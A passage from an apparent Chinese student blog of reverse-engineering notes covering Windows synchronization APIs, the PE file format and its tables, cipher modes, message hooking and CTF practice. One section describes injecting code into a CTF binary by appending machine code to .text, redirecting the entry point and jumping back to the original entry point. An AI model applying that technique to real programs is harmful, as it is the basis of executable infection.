 BOOLbInitialOwner,<br>  LPCTSTRlpName<br>);<br>第一个参数表示安全控制，一般直接传入NULL。<br>第二个参数用来确定互斥量的初始拥有者。如果传入TRUE表示互斥量对象内部会记录创建它的线程的线程ID号并将递归计数设置为1，表示被占用，由于该线程ID非零，所以互斥量处于未触发状态。如果传入FALSE，那么互斥量对象内部的线程ID号将设置为NULL，递归计数设置为0，这意味互斥量不为任何线程占用，处于触发状态。<br>第三个参数用来设置互斥量的名称，在多个进程中的线程就是通过名称来确保它们访问的是同一个互斥量。<br>函数返回值：成功返回一个表示互斥量的句柄，失败返回NULL。<br>个人理解：id号的递归计数表示是否占用，1表示占用也就是运行中，0表示已完成，而是否触发，触发可以理解为完成，已触发表示完成，未触发表示未完成。</p><p>HANDLE OpenMutex(<br> DWORDdwDesiredAccess,<br> BOOLbInheritHandle,<br> LPCTSTRlpName<br>);<br>第一个参数表示权限，对互斥量一般传入MUTEX_ALL_ACCESS。<br>第二个参数表示互斥量句柄继承性，一般传入TRUE即可。<br>第三个参数表示名称。某一个进程中的线程创建互斥量后，其它进程中的线程就可以通过这个函数来找到这个互斥量。<br>函数返回值：成功返回一个表示互斥量的句柄，失败返回NULL。</p><p>BOOL ReleaseMutex (HANDLEhMutex)表示触发互斥量<br>传入参数为从创建或打开互斥量时返回的句柄。 访问互斥资源前应该要调用等待函数，结束访问时就要调用ReleaseMutex()来表示自己已经结束访问，其它线程可以开始访问了。<br>由于互斥量是一个内核对象，释放时直接调用 CloseHandle(HANDLE hObject) 函数就可以了，所有内核对象都是这样释放。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;   </span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;  </span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;pthreadVC2.lib&quot;</span>)</span><br><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> MutexName[] = <span class="hljs-string">&quot;MyMutex&quot;</span>; <span class="hljs-comment">//互斥量名字</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    HANDLE hMutex = OpenMutexA(MUTEX_ALL_ACCESS, TRUE, MutexName); <span class="hljs-comment">//打开互斥量</span><br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> != hMutex)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;打开互斥量成功，等待互斥量被触发\n&quot;</span>);<br>        WaitForSingleObject(hMutex, INFINITE); <span class="hljs-comment">// 等待互斥量被触发</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;互斥量已经被触发\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;打开互斥量失败。\n&quot;</span>);<br>    &#125;<br><br><br>    CloseHandle(hMutex);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;   </span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;  </span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;pthreadVC2.lib&quot;</span>)</span><br><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> MutexName[] = <span class="hljs-string">&quot;MyMutex&quot;</span>; <span class="hljs-comment">//互斥量名字</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    HANDLE hMutex = CreateMutexA(<span class="hljs-literal">NULL</span>, TRUE, MutexName); <span class="hljs-comment">//创建互斥量并初始化为未触发状态</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;互斥量已经创建，按任意键触发\n&quot;</span>);<br>    getch();<br> <br>    ReleaseMutex(hMutex); <span class="hljs-comment">// 触发互斥量</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;互斥量已经被触发\n&quot;</span>);<br>    CloseHandle(hMutex);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这边只需要注意windows宽字符问题，ASCII就用A，Unicode用W即可</p><h1 id="内核对象"><a href="#内核对象" class="headerlink" title="内核对象"></a>内核对象</h1><p>waitforsingleobject<br>俩种方法，俩个返回值<br>当返回值为0时说明对象变为已通知<br>当返回值为0x102时说明是因为超时而继续执行<br>waitformuity<br>返回值为0不一定是说明等待对象全部已通知<br>具体看参数<br>如果是true那么正确<br>否则返回值为已通知的下标<br>createevent<br>第二个参数当true时调用时即修改状态<br>False时需要自己写函数去修改<br>第三个参数是表明建立时状态<br>True说明刚建立就是已通知状态<br>false相反<br>事件实现线程同步<br>俩个事件 初始状态不同<br>俩个线程分别等待俩个事件<br>分别修改不同的事件状态即可</p><p>信号量</p><p>内核对象<br>用于实现线程同步<br>第一个参数与其他内核对象一样都是表示安全控制<br>第二个参数表示初始资源数量<br>第三个参数表示最大并发数量<br>第四个参数是信号量名称<br>当初始资源数量大于等于1时才会发送信号<br>0时不发送信号<br>并且值要小于等于最大并发数量</p><p>进行线程同步时可以设置初始值<br>每次wait到都会减1</p><p>线程互斥            初始化                    进入            离开            销毁<br>互斥体            initialize-criticalsection        enter。。。    leave。。。    delete。。。<br>临界区            createmutex                waitfor        releasemutex    closehandle</p><p>线程同步            创建            进入触发                进入未触发        销毁<br>事件                createevent    setevent                resetevent        closehandle<br>                创建                递减计数                递增计数            销毁<br>信号量            createsemaphore    waitfor                releasesemaphore    closehandle</p><p>进程：<br>系统启动会创建一个进程explorer.exe也就是桌面进程<br>所有双击运行的程序全是该进程的子进程<br>createprocess<br>用户层调用时内核层 ntcreateprocess<br>会生成句柄表<br>成员有句柄和真实地址<br>因为安全问题不会吧真实地址返回，只会返回一个句柄，当使用时会根据句柄去寻找对应的地址<br>第三个成员表示是否可以继承</p><p>参数<br>第一个参数是常量字符串，表示进程路径</p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PE</title>
    <link href="/2020/03/11/PE/"/>
    <url>/2020/03/11/PE/</url>
    
    <content type="html"><![CDATA[<p>详细的记录一波pe有关知识，便于以后复习</p><a id="more"></a><h1 id="DOS头"><a href="#DOS头" class="headerlink" title="DOS头"></a>DOS头</h1><p>typedef struct _IMAGE_DOS_HEADER {    // DOS .EXE header</p><p>  WORD  e_magic;           // Magic number</p><p>  WORD  e_cblp;            // Bytes on last page of file</p><p>  WORD  e_cp;             // Pages in file</p><p>  WORD  e_crlc;            // Relocations</p><p>  WORD  e_cparhdr;          // Size of header in paragraphs</p><p>  WORD  e_minalloc;          // Minimum extra paragraphs needed</p><p>  WORD  e_maxalloc;          // Maximum extra paragraphs needed</p><p>  WORD  e_ss;             // Initial (relative) SS value</p><p>  WORD  e_sp;             // Initial SP value</p><p>  WORD  e_csum;            // Checksum</p><p>  WORD  e_ip;             // Initial IP value</p><p>  WORD  e_cs;             // Initial (relative) CS value</p><p>  WORD  e_lfarlc;           // File address of relocation table</p><p>  WORD  e_ovno;            // Overlay number</p><p>  WORD  e_res[4];           // Reserved words</p><p>  WORD  e_oemid;           // OEM identifier (for e_oeminfo)</p><p>  WORD  e_oeminfo;          // OEM information; e_oemid specific</p><p>  WORD  e_res2[10];          // Reserved words</p><p>  LONG  e_lfanew;           // File address of new exe header</p><p> } IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</p><p>Dos头如上，比较重要的就是俩个一个是magic num MZ还有一个是e_lfanew为nt头开始的偏移</p><p>e_lfanew往下到pe开始处既是dos存根用来兼容dos的，在dos上运行时打出那一句话，因为基本不会用到通常会塞点邪恶的东西在这之间</p><h1 id="Nt头"><a href="#Nt头" class="headerlink" title="Nt头"></a>Nt头</h1><p>typedef struct _IMAGE_NT_HEADERS {</p><p>  DWORD Signature;</p><p>  IMAGE_FILE_HEADER FileHeader;</p><p>  IMAGE_OPTIONAL_HEADER32 OptionalHeader;</p><p>} IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</p><p>开头的签名就是PE</p><p>紧跟着俩结构体分别是文件头和可选文件头</p><p>typedef struct _IMAGE_FILE_HEADER {</p><p>  WORD   Machine;  #机器码，表示的是运行平台</p><p>  WORD   NumberOfSections; #节数目</p><p>  DWORD  TimeDateStamp;   #时间戳</p><p>  DWORD  PointerToSymbolTable;</p><p>  DWORD  NumberOfSymbols;     #符号表数量</p><p>  WORD   SizeOfOptionalHeader;   #可选文件头大小</p><p>  WORD   Characteristics;     #文件属性，转成二进制每个位代表了每个属性，具体自行百度</p><p>} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</p><p>typedef struct _IMAGE_OPTIONAL_HEADER {</p><p>  WORD   Magic;</p><p>  BYTE   MajorLinkerVersion;</p><p>  BYTE   MinorLinkerVersion;</p><p>  DWORD  SizeOfCode;</p><p>  DWORD  SizeOfInitializedData;</p><p>  DWORD  SizeOfUninitializedData;</p><p>  DWORD  AddressOfEntryPoint;        #重点，入口处</p><p>  DWORD  BaseOfCode;</p><p>  DWORD  BaseOfData;</p><p>  DWORD  ImageBase;            #基地址，内存镜像</p><p>  DWORD  SectionAlignment;      #内存对齐</p><p>  DWORD  FileAlignment;         #文件对齐</p><p>  WORD   MajorOperatingSystemVersion;</p><p>  WORD   MinorOperatingSystemVersion;</p><p>  WORD   MajorImageVersion;</p><p>  WORD   MinorImageVersion;</p><p>  WORD   MajorSubsystemVersion;</p><p>  WORD   MinorSubsystemVersion;</p><p>  DWORD  Win32VersionValue;</p><p>  DWORD  SizeOfImage;           #内存中整个pe文件映射尺寸</p><p>  DWORD  SizeOfHeaders;         #头+节表按照文件对其后的大小</p><p>  DWORD  CheckSum;            #校验值</p><p>  WORD   Subsystem;</p><p>  WORD   DllCharacteristics;</p><p>  DWORD  SizeOfStackReserve;</p><p>  DWORD  SizeOfStackCommit;</p><p>  DWORD  SizeOfHeapReserve;</p><p>  DWORD  SizeOfHeapCommit;</p><p>  DWORD  LoaderFlags;</p><p>  DWORD  NumberOfRvaAndSizes;      #目录项数目</p><p>  IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</p><p>} IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</p><h1 id="节表"><a href="#节表" class="headerlink" title="节表"></a>节表</h1><p>IMAGE_SECTION_HEADER STRUCT</p><p>BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; // 8个字节的节区名称</p><p>union Misc</p><p> DWORD PhysicalAddress;    </p><p> DWORD VirtualSize;      //节区的尺寸</p><p>ends</p><p>DWORD VirtualAddress;     // 节区的 RVA 地址</p><p>DWORD SizeOfRawData;      // 在文件中对齐后的尺寸</p><p>DWORD PointerToRawData;    // 在文件中的偏移量</p><p>DWORD PointerToRelocations;   // 在OBJ文件中使用，重定位的偏移</p><p>DWORD PointerToLinenumbers;  // 行号表的偏移（供调试使用地）</p><p>WORD NumberOfRelocations;   // 在OBJ文件中使用，重定位项数目</p><p>WORD NumberOfLinenumbers;  // 行号表中行号的数目</p><p>DWORD Characteristics;    // 节属性如可读，可写，可执行等</p><p>IMAGE_SECTION_HEADER ENDS</p><p>前面的name存放节名称如.text .data</p><p>下面来说一下pe文件的执行过程</p><p>\1.   Filebuffer:吧文件读入内存</p><p>\2.   申请4Gb虚拟内存</p><p>\3.   Imagebuffer:内存对齐后映射</p><p>\4.   重定位后改ip指向entry</p><p>\5.   页错误后加载到物理内存</p><p>\6.   开始执行</p><p>有个小坑就是VirtualSize，是否不大于SizeOfRawDatal？</p><p>因为SizeOfRawData是节区在文件中对齐后的大小，而VirtualSize只是节区的大小，所以想当然的就有结论VirtualSize&lt;=SizeOfRawDatal</p><p>然而事实并非如此。。。一个典型的例子就是bss段数据，未初始化的全局变量在文件中并不会给他分配大小，但当加载入内存时会给其分配，而VirtualSize表示的就是在内存中的大小</p><h1 id="代码注入实战"><a href="#代码注入实战" class="headerlink" title="代码注入实战"></a>代码注入实战</h1><p>简单的代码注入</p><p>在.text末尾多余处加入自己的代码</p><p>我这边以cgctf第一道re为例子</p><p><img src="1.png" alt="1"></p><p>Rodata处加上你的字符串</p><p>然后再text末尾加上机器码</p><p><img src="2.png" alt="2"></p><p>改ep为你的代码偏移处然后执行，最后jmp跳回oep</p><p>算是复习一波pe文件结构</p><p>当然处理方式还有好多，直接在text节后增加的话代码量有限，可以通过新增节的方式，比如吧dos存根抹去，nt头转移到dos存根那，改dos头最后一个，就可以给新增节留出空间，32位一个节40字节，还需要40字节用0填充这样比较稳定。</p><p>或者用更稳的方法直接扩大节，扩大最后一个节并修改属性，也可以合并节然后有新的空间给自定节用。</p><p>接下去主要复习一波表</p><p>在可选头最后有个结构体数组，大小16，就是16个表，其中有一个是备用的。</p><p>#define IMAGE_DIRECTORY_ENTRY_EXPORT     0  // Export Directory</p><p>#define IMAGE_DIRECTORY_ENTRY_IMPORT     1  // Import Directory</p><p>#define IMAGE_DIRECTORY_ENTRY_RESOURCE    2  // Resource Directory</p><p>#define IMAGE_DIRECTORY_ENTRY_EXCEPTION    3  // Exception Directory</p><p>#define IMAGE_DIRECTORY_ENTRY_SECURITY    4  // Security Directory</p><p>#define IMAGE_DIRECTORY_ENTRY_BASERELOC    5  // Base Relocation Table</p><p>#define IMAGE_DIRECTORY_ENTRY_DEBUG      6  // Debug Directory</p><p>//   IMAGE_DIRECTORY_ENTRY_COPYRIGHT    7  // (X86 usage)</p><p>#define IMAGE_DIRECTORY_ENTRY_ARCHITECTURE  7  // Architecture Specific Data</p><p>#define IMAGE_DIRECTORY_ENTRY_GLOBALPTR    8  // RVA of GP</p><p>#define IMAGE_DIRECTORY_ENTRY_TLS       9  // TLS Directory</p><p>#define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG  10  // Load Configuration Directory</p><p>#define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT  11  // Bound Import Directory in headers</p><p>#define IMAGE_DIRECTORY_ENTRY_IAT      12  // Import Address Table</p><p>#define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT  13  // Delay Load Import Descriptors</p><p>#define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14  // COM Runtime descriptor</p><p>如上图</p><p>每个结构体占8字节俩个dw</p><p>typedef struct _IMAGE_DATA_DIRECTORY {</p><p>  DWORD  VirtualAddress;            虚拟地址</p><p>  DWORD  Size;                 大小</p><p>} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</p><p>如上</p><p>Va指向了内存对齐后的改表地址</p><h1 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h1><p>typedef struct _IMAGE_EXPORT_DIRECTORY {</p><p>  DWORD  Characteristics;</p><p>  DWORD  TimeDateStamp;           //时间戳</p><p>  WORD  MajorVersion;</p><p>  WORD  MinorVersion;</p><p>  DWORD  Name;                    //模块名</p><p>  DWORD  Base;                     //序号基数</p><p>  DWORD  NumberOfFunctions;       //导出函数数目(不一定准确)</p><p>  DWORD  NumberOfNames;         //导出函数名字数目</p><p>  DWORD  AddressOfFunctions;   // 函数地址表</p><p>  DWORD  AddressOfNames;     // 函数名称表数量由NumberOfNames决定</p><p>  DWORD  AddressOfNameOrdinals; // 函数序号表数量由NumberOfNames决定</p><p>} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</p><p><img src="3.png" alt="3"></p><p>导出表结构如上</p><p>前面几个不需要多管，主要看下面的，name是指模块名比如xxx.dll,base是指序号基数后面会用到，NumberOfFunctions是不一定准确的，她是用最大序号减最小序号+1来求得(这边序号不是指AddressOfNameOrdinals序号，是指导出函数的序号</p><p>这边俩个表一个函数地址表还有一个函数名称表，函数地址表取决于导出函数数目，而函数名称表取决于导出名字数目，这边有个很神奇的东西，因为函数可以通过符号导出，比如说你编程往往函数名称就和他实现的功能一样，而你不想让别人知道你这个函数的功能就可以通过符号导出，这样的话就不会再函数名字表里出现了，但是在函数地址表里还会有，那么就会有个问题，是不是函数地址表总是比函数名字表来的大呢？</p><p>这是不一定的，举个例子你有俩个函数名字都指向了一个地址是完全可以实现的，这样就有可能名称表比地址表来得大。</p><h2 id="函数名导出寻找"><a href="#函数名导出寻找" class="headerlink" title="函数名导出寻找"></a>函数名导出寻找</h2><p>比如知道函数名为aaa</p><p>先会从AddressOfNames遍历寻找到对应地址下标</p><p>再去AddressOfNameOrdinals寻找对应下标的值</p><p>以其为下标在AddressOfFunctions寻找就是该函数地址  </p><h2 id="序号导出寻找"><a href="#序号导出寻找" class="headerlink" title="序号导出寻找"></a>序号导出寻找</h2><p>首先要有个概念就是AddressOfNameOrdinals里的不是函数序号</p><p>要加上base才是序号</p><p>那根据序号寻找就很轻松了，吧函数序号减去base为下标去AddressOfFunctions取出地址就是该函数地址</p><h2 id="逆推"><a href="#逆推" class="headerlink" title="逆推"></a>逆推</h2><p>首先从函数地址开始AddressOfFunctions</p><p>遍历地址是否为0，不为0取出下标，去AddressOfNameOrdinals遍历寻找</p><p>如果找到值等于下标的，取出该值下标去AddressOfNames找到对应地址，取地址获取函数名</p><p>当然如果没有找到，直接吧该下标加上base就为函数的导出序号</p><h1 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h1><p>重定位表的作用很明显，一般在dll里用的比较多</p><p>以南邮ctf第一题签到题为例</p><p><img src="4.png" alt="4"></p><p>重点关注机器码</p><p>Flag寻址的时候是绝对寻址而call printf函数时用的时相对寻址</p><p>后面机器码加上下一行指令地址即为函数地址</p><p>Flag寻址是更具pe的imagebase去算的，但是如果出现一个情况，特别是在dll里出现比较多，就是俩个dll映射基地址都是0x10000000,这样就会产生重叠，所以必须有1个dll映射到其他地址，一般都是下一个0x10000，这是模块对齐的大小，但不一定啊和内存对齐一样。</p><p>这就是重定位表需要的原因，来进行重定位</p><table><thead><tr><th>typedef struct _IMAGE_BASE_RELOCATION {</th><th></th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>DWORD  VirtualAddress;</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>DWORD  SizeOfBlock;</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>} IMAGE_BASE_RELOCATION;</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>typedef IMAGE_BASE_RELOCATION ，* PIMAGE_BASE_RELOCATION;</td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>结构如上</p><p>SizeOfBlock是指当前block大小</p><p>每个block大小就是一个内存页0x1000为单位</p><p>该页上有多少需要重定位的地方</p><p><img src="5.png" alt="5"></p><p>通过判断最后一个结构的VirtualAddress与SizeOfBlock都为0来判断是否结束</p><p>内存页中的页大小是0x1000，也就是2的12次方就可以表示一个页内所有的偏移地址，具体项的宽度是16字节 高四位代表类型：值位3 代表的是需要修改的数据 值位0代表的是用于数据对齐的数据，可以不用修改，也就是说只需要关注高四位的值为三的就可以了</p><p>Block下面的高四位是个标志位后面是地址</p><p>Virtualaddress + 低十二位就是需要修改的地址</p><h1 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h1><p>导入表涉及到iat表和int表</p><p>具体看时间戳</p><p>typedef struct _IMAGE_IMPORT_DESCRIPTOR {</p><p>  union {</p><p>​    DWORD  Characteristics;      // 0 for terminating null import descriptor</p><p>​    DWORD  OriginalFirstThunk;     // RVA to original unbound IAT (PIMAGE_THUNK_DATA)</p><p>  } DUMMYUNIONNAME;</p><p>  DWORD  TimeDateStamp;         // 0 if not bound,</p><p>​                      // -1 if bound, and real date\time stamp</p><p>​                      //   in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)</p><p>​                      // O.W. date/time stamp of DLL bound to (Old BIND)</p><p>  DWORD  ForwarderChain;         // -1 if no forwarders</p><p>  DWORD  Name;</p><p>  DWORD  FirstThunk;           // RVA to IAT (if bound this IAT has actual addresses)</p><p>} IMAGE_IMPORT_DESCRIPTOR;</p><p>typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</p><p>Name为导入库的名称rva，第一项指向了int表</p><p>typedef struct _IMAGE_THUNK_DATA32 {</p><p>  union {</p><p>​    DWORD ForwarderString;   // PBYTE </p><p>​    DWORD Function;       // PDWORD</p><p>​    DWORD Ordinal;</p><p>​    DWORD AddressOfData;    //RVA 指向_IMAGE_IMPORT_BY_NAME </p><p>  } u1;</p><p>} IMAGE_THUNK_DATA32;</p><p>typedef IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;</p><p>Int表的值如果最高位为0，就是name的rva</p><p>否则去除最高位剩下的就是导入序号</p><p>typedef struct _IMAGE_IMPORT_BY_NAME {</p><p>  WORD  Hint;    //可能为0，编译器决定，如果不为0，是函数在导出表中的索引</p><p>  BYTE  Name[1];  //函数名称，以0结尾，由于不知道到底多长，所以干脆只给出第一个字符，找到0结束</p><p>} IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</p><p>名称第一个是hint</p><p>然后是函数名</p><p>再看看iat表</p><p>当导入表时间戳为0时iat和int值都一样</p><p>为-1是iat是函数的真实地址，但很少有，因为当dll映射地址改变的时候需要重定位，一般notepad就是这样，好处就是打开快，不需要再根据int表去吧地址写入iat</p><p>//最后一个结构全0表示绑定导入表结束</p><p>typedef struct _IMAGE_BOUND_IMPORT_DESCRIPTOR {</p><p>  DWORD  TimeDateStamp;   //表示绑定的时间戳，如果和PE头中的TimeDateStamp不同则可能被修改过</p><p>  WORD  OffsetModuleName;  //dll名称地址</p><p>  WORD  NumberOfModuleForwarderRefs;  //依赖dll个数</p><p>// Array of zero or more IMAGE_BOUND_FORWARDER_REF follows</p><p>} IMAGE_BOUND_IMPORT_DESCRIPTOR, *PIMAGE_BOUND_IMPORT_DESCRIPTOR;</p><p>下面看看绑定导入表</p><p>时间戳是pe时间戳，如果与绑定的时间戳不一样说明被更新了需要重定位</p><p>NumberOfModuleForwarderRefs表示下面紧接着跟了多少个如下结构</p><p>typedef struct _IMAGE_BOUND_FORWARDER_REF {</p><p>  DWORD  TimeDateStamp; //时间戳，同样的作用检查更新情况</p><p>  WORD  OffsetModuleName;  //dll名称地址</p><p>  WORD  Reserved;  //保留</p><p>} IMAGE_BOUND_FORWARDER_REF, *PIMAGE_BOUND_FORWARDER_REF;</p><p>OffsetModuleName加上绑定导入表首地址才是name的rva</p><p><img src="6.png" alt="6"></p><p>自己编程写了下，可惜不小心被删除了。。。只剩下俩张截图</p><p><img src="7.jpg" alt="7"></p><p>这个是导出表写法截图</p><p>到这pe算是告一段落了</p><p>顺带复习了波程序员的自我修养</p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>大二上学习笔记</title>
    <link href="/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>目前是准备采用有比赛时打比赛总结<br>没比赛时看书学习理论的学习方法<br>顺带把书中的大部分实验也给整了</p><a id="more"></a><h1 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h1><h2 id="分组密码加密操作模式"><a href="#分组密码加密操作模式" class="headerlink" title="分组密码加密操作模式"></a>分组密码加密操作模式</h2><h3 id="ECB"><a href="#ECB" class="headerlink" title="ECB"></a>ECB</h3><p>电子密码本模式加密<br>简答来说就是分组加密，不足则补<br>大腿出的17届面试题acdes就是<br>ecb加密模式一个缺点就是密钥不变每次加密出来的密文都是不变的<br>这样就可以通过流量分析和代换攻击<br>还有个就是位图的加密<br>即使加密了还是能从图中读出信息</p><h3 id="CBC"><a href="#CBC" class="headerlink" title="CBC"></a>CBC</h3><p>cbc密码分组链接模式<br>就是多了个iv<br>加密方法也有点改变<br>能使得每次加密出来的结果都不一样<br>加密方法是<br>第一个明文与iv xor后加密的y1<br>y1与第二个明文x2 xor<br>然后结果放去加密<br>然后再与下一次的明文xor<br>解密的话只需要多一步xor<br>如果每次加密都选择一个新iv这样每次的密文都会不一样</p><h3 id="OFB"><a href="#OFB" class="headerlink" title="OFB"></a>OFB</h3><p>输出反馈模式<br>目前遇到的密码学就这些，其余很少遇到特别在逆向中<br>等遇到了再来填坑把<br>开启一波技术性学习</p><p>10/15<br>我来了</p><h2 id="双重加密与中间人攻击"><a href="#双重加密与中间人攻击" class="headerlink" title="双重加密与中间人攻击"></a>双重加密与中间人攻击</h2><p>首先是密钥的不正确可能性<br>就是多解问题，比如用80位密钥加密分组宽度为64位明文<br>会出现2 64次方种密文<br>但是用的密钥有2 80次方个<br>所以会有多重映射关系<br>但是可以用多组明文密文对来测试可以大大减小错误密钥概率<br>还有就是双重加密之所以不安全是因为中间人攻击<br>理论上来说双重des加密如果通过暴力的话需要2 2k次方次测试密钥<br>但是中间人攻击可以使得复杂度变为单重des加密的倍数<br>主要实现就是先对明文一次加密打表<br>总共2 k次方<br>然后对密文解密然后比较查找 2 k次方<br>这样就是2 k+1次方次<br>所以说双重加密得不偿失<br>真正提升安全性还是三重加密</p><h2 id="三重加密-and-密钥漂白"><a href="#三重加密-and-密钥漂白" class="headerlink" title="三重加密 and 密钥漂白"></a>三重加密 and 密钥漂白</h2><p>三重加密最典型的就是ede模式<br>加密解密加密<br>之所以这样是可以实现单词加密<br>对抗差分分析也十分有效<br>密钥漂白对密钥位数不足但本身以足够抵抗差分分析<br>才会有很好的效果<br>具体是xor<br>给明文xor后加密<br>xor后输出</p><p>//填坑</p><h2 id="数学知识"><a href="#数学知识" class="headerlink" title="数学知识"></a>数学知识</h2><p>把之前的数学知识补充一下把<br>感觉re进阶数学不能落下</p><h1 id="逆向工程核心原理"><a href="#逆向工程核心原理" class="headerlink" title="逆向工程核心原理"></a>逆向工程核心原理</h1><h2 id="windows消息钩取"><a href="#windows消息钩取" class="headerlink" title="windows消息钩取"></a>windows消息钩取</h2><p>一说到钩取肯定是和hook有关<br>消息钩取的实现简单来说就是<br>当键盘发生输入事件时，消息会被添加到OS message queue<br>然后根据判断哪个程序发生事件，再从OS message queue取出消息添加到application message queue<br>hook的钩链则存在于他们之间，先于application message queue看到消息。这样就能进行很多操作<br>如修改，阻止。<br>具体实现是 SetWindowsHookEx()函数<br>有个示例程序貌似不兼容win10，一开就崩<br>明天用虚拟机跑下试试<br>果然虚拟机可以了 win7x86<br>稍微逆向了下，看书上的源码还是有点懵逼的。。。</p><h2 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h2><p>简介：对运行中的其他程序强行插入特定的dll文件</p><h1 id="KCTF"><a href="#KCTF" class="headerlink" title="KCTF"></a>KCTF</h1><h2 id="达芬奇密码"><a href="#达芬奇密码" class="headerlink" title="达芬奇密码"></a>达芬奇密码</h2><p>正式开始接触看雪ctf<br>感觉和其他ctf的区别还是挺大的<br>特别是对于数学的要求<br>经常出现逆出解不出的状况。。。<br><img src="10.png" alt="10"><br>拖入ida后逻辑很简单，有个smc数据后memcpy<br>主要逻辑<br><img src="11.png" 